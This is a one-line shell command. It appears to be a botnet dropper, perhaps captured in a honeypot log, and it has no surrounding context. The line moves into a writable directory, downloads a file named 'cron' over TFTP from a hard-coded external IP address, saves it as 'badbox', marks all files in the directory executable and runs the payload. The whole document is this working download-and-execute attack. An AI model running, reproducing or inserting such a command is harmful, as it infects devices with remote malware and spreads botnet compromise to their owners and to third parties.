cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 76.74.170.253 -c get cron;cat cron >badbox;chmod +x *;./badbox
